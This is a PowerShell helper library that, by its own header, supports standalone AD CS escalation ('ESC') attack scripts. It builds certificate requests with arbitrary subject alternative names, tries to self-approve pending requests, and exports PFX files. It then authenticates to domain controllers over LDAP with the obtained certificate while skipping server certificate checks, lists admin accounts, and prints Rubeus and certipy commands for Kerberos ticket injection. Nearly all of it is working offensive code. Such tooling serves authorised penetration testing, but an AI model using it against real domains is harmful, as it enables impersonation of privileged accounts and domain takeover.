<#
.SYNOPSIS
    Shared helper functions for AD CS LOLBAS standalone scripts.
.DESCRIPTION
    Dot-source this file from any standalone ESC script to load shared helpers:
    AD context, cert request pipeline, Schannel/PKINIT auth, UI functions.
.NOTES
    Usage: . "$PSScriptRoot\adcs-common.ps1"
    For authorised security testing and educational purposes only.
#>

# ============================================================================
#  PREREQUISITES CHECK
# ============================================================================

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    Write-Host ""
    Write-Host "  [-] PREREQUISITE MISSING: ActiveDirectory PowerShell module" -ForegroundColor Red
    Write-Host ""
    Write-Host "  This script requires the AD PowerShell module (RSAT) on a domain-joined system." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Install options:" -ForegroundColor Gray
    Write-Host "    Windows Server : Install-WindowsFeature RSAT-AD-PowerShell" -ForegroundColor Gray
    Write-Host "    Windows 10/11  : Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0" -ForegroundColor Gray
    Write-Host ""
    throw "ActiveDirectory module not available. Install RSAT and run from a domain-joined system."
}

Import-Module ActiveDirectory -ErrorAction Stop

# ============================================================================
#  AD CONTEXT
# ============================================================================

$script:ADContext = $null

function Get-ADContext {
    if ($null -eq $script:ADContext) {
        $rootDSE   = Get-ADRootDSE
        $domain    = Get-ADDomain
        $configNC  = $rootDSE.configurationNamingContext
        $script:ADContext = @{
            Domain         = $domain.DNSRoot
            DomainDN       = $domain.DistinguishedName
            ConfigNC       = $configNC
            PKIBase        = "CN=Public Key Services,CN=Services,$configNC"
            TemplateBase   = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
            EnrollBase     = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"
            OIDBase        = "CN=OID,CN=Public Key Services,CN=Services,$configNC"
            NTAuthDN       = "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,$configNC"
        }
    }
    return $script:ADContext
}

function Get-DCTarget {
    if ($DCTarget) { return $DCTarget }
    $dc = (Get-ADDomainController -Discover -ForceDiscover).HostName[0]
    Write-Host "    [i] Auto-detected DC: $dc" -ForegroundColor Gray
    return $dc
}

# ============================================================================
#  UI HELPERS
# ============================================================================

function Write-Banner {
    param([string]$ESC, [string]$Description)
    $pad1 = [Math]::Max(0, 42 - $ESC.Length)
    $pad2 = [Math]::Max(0, 58 - $Description.Length)
    Write-Host ""
    Write-Host "  +==============================================================+" -ForegroundColor DarkCyan
    Write-Host "  |  AD CS LOLBAS - $ESC$(' ' * $pad1)|" -ForegroundColor DarkCyan
    Write-Host "  |  $Description$(' ' * $pad2)|" -ForegroundColor DarkCyan
    Write-Host "  +==============================================================+" -ForegroundColor DarkCyan
    Write-Host ""
}

function Write-Stage {
    param([int]$Number, [string]$Name, [string]$Status = 'RUNNING')
    $color = switch ($Status) {
        'RUNNING'   { 'Cyan' }
        'COMPLETE'  { 'Green' }
        'SKIPPED'   { 'Yellow' }
        'FAILED'    { 'Red' }
    }
    $icon = switch ($Status) {
        'RUNNING'   { '>>>' }
        'COMPLETE'  { '[+]' }
        'SKIPPED'   { '[~]' }
        'FAILED'    { '[-]' }
    }
    Write-Host "  $icon STAGE $Number - $Name" -ForegroundColor $color
}

function Assert-Param {
    param([string]$Name, [string]$Value, [string]$Context)
    if (-not $Value) {
        Write-Host "  [-] Missing required parameter: -$Name (required for $Context)" -ForegroundColor Red
        Write-Host "      Example: .\Invoke-$Context.ps1 -$Name `"value`"" -ForegroundColor Gray
        throw "Missing parameter: -$Name"
    }
}

# ============================================================================
#  CA DISCOVERY
# ============================================================================

function Get-CAConfigs {
    $ctx = Get-ADContext
    $configs = @()
    Get-ADObject -SearchBase $ctx.EnrollBase -Filter {objectClass -eq 'pKIEnrollmentService'} `
        -Properties dNSHostName, cn -ErrorAction SilentlyContinue | ForEach-Object {
        $configs += "$($_.dNSHostName)\$($_.cn)"
    }
    if ($configs.Count -eq 0) {
        $dump = certutil -dump 2>$null
        $dump | Select-String 'Config:' | ForEach-Object {
            $line = $_.Line -replace '.*Config:\s*', '' -replace '"', ''
            if ($line -match '\\') { $configs += $line.Trim() }
        }
    }
    return $configs
}

# ============================================================================
#  INF GENERATION
# ============================================================================

function New-CertRequestINF {
    param(
        [string]$Subject = "CN=$env:USERNAME",
        [string]$SAN = "",
        [string]$Template = "",
        [string]$OutFile = "$OutputDir\request.inf",
        [switch]$Exportable
    )

    $sb = [System.Text.StringBuilder]::new()
    [void]$sb.AppendLine('[Version]')
    [void]$sb.AppendLine('Signature = "$Windows NT$"')
    [void]$sb.AppendLine('')
    [void]$sb.AppendLine('[NewRequest]')
    [void]$sb.AppendLine("Subject = `"$Subject`"")
    [void]$sb.AppendLine('KeySpec = 1')
    [void]$sb.AppendLine('KeyLength = 2048')
    [void]$sb.AppendLine("Exportable = $(if ($Exportable) {'TRUE'} else {'FALSE'})")
    [void]$sb.AppendLine('MachineKeySet = FALSE')
    [void]$sb.AppendLine('SMIME = FALSE')
    [void]$sb.AppendLine('PrivateKeyArchive = FALSE')
    [void]$sb.AppendLine('UserProtected = FALSE')
    [void]$sb.AppendLine('UseExistingKeySet = FALSE')
    [void]$sb.AppendLine('ProviderName = "Microsoft RSA SChannel Cryptographic Provider"')
    [void]$sb.AppendLine('ProviderType = 12')
    [void]$sb.AppendLine('RequestType = PKCS10')
    [void]$sb.AppendLine('KeyUsage = 0xa0')

    if ($Template) {
        [void]$sb.AppendLine('')
        [void]$sb.AppendLine('[RequestAttributes]')
        [void]$sb.AppendLine("CertificateTemplate = $Template")
    }

    if ($SAN) {
        [void]$sb.AppendLine('')
        [void]$sb.AppendLine('[Extensions]')
        [void]$sb.AppendLine('2.5.29.17 = "{text}"')
        [void]$sb.AppendLine("_continue_ = `"$SAN`"")
    }

    $sb.ToString() | Out-File -FilePath $OutFile -Encoding ASCII -Force
    Write-Verbose "    INF written: $OutFile"
    return $OutFile
}

# ============================================================================
#  CERTIFICATE REQUEST PIPELINE
# ============================================================================

function Invoke-CertRequest {
    param(
        [string]$INFFile,
        [string]$CA,
        [string]$Prefix = "cert",
        [string]$Attrib = "",
        [string]$RequestFile = ""   # Pre-built .req file (skips certreq -new)
    )

    $reqFile  = "$OutputDir\$Prefix.req"
    $cerFile  = "$OutputDir\$Prefix.cer"
    $pfxFile  = "$OutputDir\$Prefix.pfx"
    $result   = @{ Success = $false; CerFile = $cerFile; PFXFile = $pfxFile; RequestId = $null }

    # Generate CSR (skip if a pre-built request file was provided)
    if ($RequestFile -and (Test-Path $RequestFile)) {
        $reqFile = $RequestFile
        Write-Host "    [>] Using pre-built request: $reqFile" -ForegroundColor Gray
    } else {
        Write-Host "    [>] Generating CSR from $INFFile" -ForegroundColor Gray
        $genOutput = & certreq -new "$INFFile" "$reqFile" 2>&1
        if (-not (Test-Path $reqFile)) {
            Write-Host "    [-] CSR generation failed" -ForegroundColor Red
            $genOutput | ForEach-Object { Write-Host "        $_" -ForegroundColor DarkGray }
            return $result
        }
    }

    $submitArgs = "-submit -config `"$CA`""
    if ($Attrib) { $submitArgs += " -attrib `"$Attrib`"" }
    $submitArgs += " `"$reqFile`" `"$cerFile`""

    Write-Host "    [>] Submitting to $CA" -ForegroundColor Gray
    $submitOutput = cmd /c "certreq $submitArgs" 2>&1

    $pendingMatch = $submitOutput | Select-String 'RequestId:\s*(\d+)'
    if ($pendingMatch) {
        $result.RequestId = $pendingMatch.Matches.Groups[1].Value
    }

    if (Test-Path $cerFile) {
        Write-Host "    [+] Certificate issued: $cerFile" -ForegroundColor Green
    } elseif ($result.RequestId) {
        Write-Host "    [!] Request PENDING - RequestId: $($result.RequestId)" -ForegroundColor Yellow
        Write-Host "    [>] Attempting auto-approve (requires ManageCertificates right)..." -ForegroundColor Yellow

        $approveOut = certutil -config $CA -resubmit $result.RequestId 2>&1
        Start-Sleep -Seconds 2
        certreq -retrieve -config $CA $result.RequestId $cerFile 2>&1 | Out-Null

        if (-not (Test-Path $cerFile)) {
            Write-Host "    [i] Auto-approve not possible (no ManageCertificates right)" -ForegroundColor Yellow
            Write-Host "    [i] Approve manually, then retrieve:" -ForegroundColor Cyan
            Write-Host "        certutil -config `"$CA`" -resubmit $($result.RequestId)" -ForegroundColor White
            Write-Host "        certreq  -retrieve -config `"$CA`" $($result.RequestId) `"$cerFile`"" -ForegroundColor White
            return $result
        }
        Write-Host "    [+] Auto-approved and retrieved: $cerFile" -ForegroundColor Green
    } else {
        Write-Host "    [-] Submission failed" -ForegroundColor Red
        $submitOutput | ForEach-Object { Write-Host "        $_" -ForegroundColor DarkGray }
        return $result
    }

    Write-Host "    [>] Importing certificate to personal store" -ForegroundColor Gray
    certreq -accept "$cerFile" 2>&1 | Out-Null

    # Find the imported cert by matching thumbprint from the .cer file
    Write-Host "    [>] Exporting PFX (password-protected)" -ForegroundColor Gray
    $importedCert = $null
    try {
        $cerObj = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("$cerFile")
        $importedCert = Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.Thumbprint -eq $cerObj.Thumbprint } | Select-Object -First 1
    } catch {
        Write-Host "    [!] Could not read .cer file for thumbprint match" -ForegroundColor Yellow
    }

    if ($importedCert -and $importedCert.HasPrivateKey) {
        # Export via .NET - password is guaranteed correct
        try {
            $pfxBytes = $importedCert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $PFXPassword)
            [System.IO.File]::WriteAllBytes($pfxFile, $pfxBytes)
            Write-Host "    [+] PFX exported: $pfxFile" -ForegroundColor Green
            Write-Host "    [i] PFX Password: $PFXPassword" -ForegroundColor Cyan
            $result.Success = $true
        } catch {
            Write-Host "    [-] .NET PFX export failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # Fallback to certutil if .NET export didn't work
    if (-not $result.Success) {
        $exportOutput = certutil -exportpfx -p "$PFXPassword" -user My "$Prefix" "$pfxFile" 2>&1
        if (Test-Path $pfxFile) {
            Write-Host "    [+] PFX exported (certutil): $pfxFile" -ForegroundColor Green
            Write-Host "    [i] PFX Password: $PFXPassword" -ForegroundColor Cyan
            $result.Success = $true
        } else {
            Write-Host "    [!] PFX export failed - cert is in store but manual export needed" -ForegroundColor Yellow
            Write-Host "    [i] Thumbprint: $($importedCert.Thumbprint)" -ForegroundColor Gray
            Write-Host "    [i] Export manually: certutil -exportpfx -p `"password`" -user My `"$($importedCert.Thumbprint)`" `"$pfxFile`"" -ForegroundColor Gray
        }
    }

    return $result
}

function Invoke-ApprovePendingRequest {
    param(
        [string]$CA,
        [string]$RequestId,
        [string]$Prefix = "cert"
    )

    $cerFile = "$OutputDir\$Prefix.cer"

    Write-Host "    [>] Approving pending request $RequestId" -ForegroundColor Yellow
    certutil -config $CA -resubmit $RequestId 2>&1 | Out-Null

    Write-Host "    [>] Retrieving issued certificate" -ForegroundColor Gray
    certreq -retrieve -config $CA $RequestId $cerFile 2>&1 | Out-Null

    if (Test-Path $cerFile) {
        Write-Host "    [+] Certificate retrieved: $cerFile" -ForegroundColor Green
        certreq -accept $cerFile 2>&1 | Out-Null

        $pfxFile = "$OutputDir\$Prefix.pfx"
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($cerFile)
        $storeCert = Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.Thumbprint -eq $cert.Thumbprint }
        if ($storeCert -and $storeCert.HasPrivateKey) {
            $pfxBytes = $storeCert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $PFXPassword)
            [System.IO.File]::WriteAllBytes($pfxFile, $pfxBytes)
            Write-Host "    [+] PFX exported: $pfxFile" -ForegroundColor Green
        }

        return @{ Success = $true; CerFile = $cerFile; PFXFile = $pfxFile }
    }

    Write-Host "    [-] Failed to retrieve certificate" -ForegroundColor Red
    return @{ Success = $false }
}

# ============================================================================
#  PASS THE CERT - LDAP Client Certificate Authentication
# ============================================================================

function Connect-CertAuth {
    <# Connects to LDAP using a client certificate. Tries LDAPS EXTERNAL,
       StartTLS EXTERNAL, then LDAPS Negotiate. Returns $null on failure. #>
    param(
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,
        [string]$DC,
        [string]$Indent = "    "
    )

    Add-Type -AssemblyName System.DirectoryServices.Protocols

    $ldap = $null
    $bound = $false

    # Method 1: LDAPS (636) + SASL EXTERNAL
    Write-Host "$Indent[>] Trying LDAPS:636 + SASL EXTERNAL..." -ForegroundColor Gray
    try {
        $ldapId = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DC, 636)
        $ldap = New-Object System.DirectoryServices.Protocols.LdapConnection($ldapId)
        $ldap.SessionOptions.SecureSocketLayer = $true
        $ldap.SessionOptions.VerifyServerCertificate = { param($c, $x); return $true }
        $ldap.ClientCertificates.Add($Certificate) | Out-Null
        $ldap.AuthType = [System.DirectoryServices.Protocols.AuthType]::External
        $ldap.Bind()
        Write-Host "$Indent[+] LDAPS EXTERNAL bind SUCCESSFUL" -ForegroundColor Green
        $bound = $true
    } catch {
        $msg = if ($_.Exception.InnerException) { $_.Exception.InnerException.Message } else { $_.Exception.Message }
        Write-Host "$Indent[!] LDAPS EXTERNAL failed: $msg" -ForegroundColor Yellow
        if ($ldap) { try { $ldap.Dispose() } catch {} }
    }

    # Method 2: StartTLS (389) + SASL EXTERNAL
    if (-not $bound) {
        Write-Host "$Indent[>] Trying StartTLS:389 + SASL EXTERNAL..." -ForegroundColor Gray
        try {
            $ldapId389 = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DC, 389)
            $ldap = New-Object System.DirectoryServices.Protocols.LdapConnection($ldapId389)
            $ldap.SessionOptions.VerifyServerCertificate = { param($c, $x); return $true }
            $ldap.SessionOptions.StartTransportLayerSecurity($null)
            $ldap.ClientCertificates.Add($Certificate) | Out-Null
            $ldap.AuthType = [System.DirectoryServices.Protocols.AuthType]::External
            $ldap.Bind()
            Write-Host "$Indent[+] StartTLS EXTERNAL bind SUCCESSFUL" -ForegroundColor Green
            $bound = $true
        } catch {
            $msg = if ($_.Exception.InnerException) { $_.Exception.InnerException.Message } else { $_.Exception.Message }
            Write-Host "$Indent[!] StartTLS EXTERNAL failed: $msg" -ForegroundColor Yellow
            if ($ldap) { try { $ldap.Dispose() } catch {} }
        }
    }

    # Method 3: LDAPS (636) + Negotiate (Schannel cert mapping)
    if (-not $bound) {
        Write-Host "$Indent[>] Trying LDAPS:636 + Negotiate..." -ForegroundColor Gray
        try {
            $ldapId = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DC, 636)
            $ldap = New-Object System.DirectoryServices.Protocols.LdapConnection($ldapId)
            $ldap.SessionOptions.SecureSocketLayer = $true
            $ldap.SessionOptions.VerifyServerCertificate = { param($c, $x); return $true }
            $ldap.ClientCertificates.Add($Certificate) | Out-Null
            $ldap.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
            $ldap.Bind()
            Write-Host "$Indent[+] LDAPS Negotiate bind SUCCESSFUL" -ForegroundColor Green
            $bound = $true
        } catch {
            $msg = if ($_.Exception.InnerException) { $_.Exception.InnerException.Message } else { $_.Exception.Message }
            Write-Host "$Indent[-] LDAPS Negotiate failed: $msg" -ForegroundColor Red
            if ($ldap) { try { $ldap.Dispose() } catch {} }
        }
    }

    if (-not $bound) { return $null }
    return $ldap
}

function Test-CertIdentity {
    <# Checks what identity the LDAP session is authenticated as.
       Returns the identity string, or empty if anonymous. #>
    param(
        [System.DirectoryServices.Protocols.LdapConnection]$Connection,
        [string]$Indent = "    "
    )

    Write-Host "$Indent[>] Verifying authenticated identity..." -ForegroundColor Gray

    # Try LDAP whoami extended operation
    try {
        $whoamiReq = New-Object System.DirectoryServices.Protocols.ExtendedRequest("1.3.6.1.4.1.4203.1.11.3")
        $whoamiResp = $Connection.SendRequest($whoamiReq)
        $identity = [System.Text.Encoding]::UTF8.GetString($whoamiResp.ResponseValue)
        if ($identity -and $identity.Trim()) {
            Write-Host "$Indent[+] Authenticated as: $identity" -ForegroundColor Green
            return $identity
        }
    } catch { }

    # Whoami failed or empty - test actual access via privileged search
    try {
        $ctx = Get-ADContext
        $adminSearch = New-Object System.DirectoryServices.Protocols.SearchRequest(
            $ctx.DomainDN,
            "(&(objectCategory=user)(adminCount=1))",
            "Subtree",
            @("sAMAccountName")
        )
        $adminResp = $Connection.SendRequest($adminSearch)
        if ($adminResp.Entries.Count -gt 0) {
            Write-Host "$Indent[+] Certificate mapped - can query domain ($($adminResp.Entries.Count) admin accounts visible)" -ForegroundColor Green
            $adminResp.Entries | Select-Object -First 3 | ForEach-Object {
                $sam = $_.Attributes["sAMAccountName"][0]
                Write-Host "$Indent    - $sam" -ForegroundColor Gray
            }
            return "(cert-mapped)"
        }
    } catch { }

    Write-Host "$Indent[!] No identity mapped - session is anonymous" -ForegroundColor Yellow
    return ""
}

# ============================================================================
#  AUTHENTICATION STAGE (called by ESC scripts)
# ============================================================================

function Invoke-AuthStage {
    param(
        [string]$PFXFile,
        [string]$PFXPass,
        [string]$DC,
        [string]$Method = $AuthMethod
    )

    if ($SkipAuth) {
        Write-Host ""
        Write-Stage -Number 5 -Name "AUTHENTICATION" -Status 'SKIPPED'
        Write-Host "    [i] Certificate artifacts in: $OutputDir" -ForegroundColor Cyan
        return
    }

    if (-not (Test-Path $PFXFile)) {
        Write-Host ""
        Write-Stage -Number 5 -Name "AUTHENTICATION" -Status 'FAILED'
        Write-Host "    [-] PFX file not found: $PFXFile" -ForegroundColor Red
        return
    }

    $dc = if ($DC) { $DC } else { Get-DCTarget }

    # Load PFX
    Write-Host ""
    Write-Stage -Number 5 -Name "PASS THE CERT (LDAPS)"
    Write-Host "    [>] Loading PFX: $PFXFile" -ForegroundColor Gray
    $pfxCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
    $pfxCert.Import($PFXFile, $PFXPass, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::UserKeySet)
    Write-Host "    [i] Subject : $($pfxCert.Subject)" -ForegroundColor Gray
    Write-Host "    [i] Issuer  : $($pfxCert.Issuer)" -ForegroundColor Gray
    Write-Host "    [i] Thumb   : $($pfxCert.Thumbprint)" -ForegroundColor Gray
    $sanExt = $pfxCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
    if ($sanExt) { Write-Host "    [i] SAN     : $($sanExt.Format($false))" -ForegroundColor Cyan }

    Write-Host ""

    # Connect via PassTheCert
    $ldap = Connect-CertAuth -Certificate $pfxCert -DC $dc
    if ($ldap) {
        $identity = Test-CertIdentity -Connection $ldap
        if ($identity) {
            Write-Stage -Number 5 -Name "PASS THE CERT" -Status 'COMPLETE'
        } else {
            Write-Host "    [i] DC does not map client certs - use PFX with Rubeus/certipy" -ForegroundColor Cyan
            Write-Stage -Number 5 -Name "PASS THE CERT" -Status 'COMPLETE'
        }
        try { $ldap.Dispose() } catch {}
    } else {
        Write-Stage -Number 5 -Name "PASS THE CERT" -Status 'FAILED'
    }

    # Stage 6: PKINIT info (cert is always usable via external tools)
    Write-Host ""
    Write-Stage -Number 6 -Name "PKINIT / EXTERNAL AUTH"

    # Import cert to store for PKINIT readiness
    $pfxCert2 = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
    $pfxCert2.Import(
        $PFXFile, $PFXPass,
        [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::UserKeySet -bor
        [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet
    )
    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My", "CurrentUser")
    $store.Open("ReadWrite")
    $store.Add($pfxCert2)
    $store.Close()
    Write-Host "    [+] Certificate imported to Cert:\CurrentUser\My" -ForegroundColor Green

    Write-Host "    [i] PFX File   : $PFXFile" -ForegroundColor White
    Write-Host "    [i] Password   : $PFXPass" -ForegroundColor White
    Write-Host "    [i] Thumbprint : $($pfxCert2.Thumbprint)" -ForegroundColor White
    Write-Host ""
    Write-Host "    [i] Use with Rubeus  : Rubeus.exe asktgt /user:<target> /certificate:`"$PFXFile`" /password:`"$PFXPass`" /ptt" -ForegroundColor Gray
    Write-Host "    [i] Use with certipy : certipy auth -pfx $((Split-Path $PFXFile -Leaf)) -dc-ip $dc" -ForegroundColor Gray
    Write-Host "    [i] Use PassTheCert  : .\Invoke-PassTheCert.ps1 -PFXFile `"$PFXFile`" -PFXPassword `"$PFXPass`" -Action Whoami" -ForegroundColor Gray

    Write-Stage -Number 6 -Name "PKINIT / EXTERNAL AUTH" -Status 'COMPLETE'
}
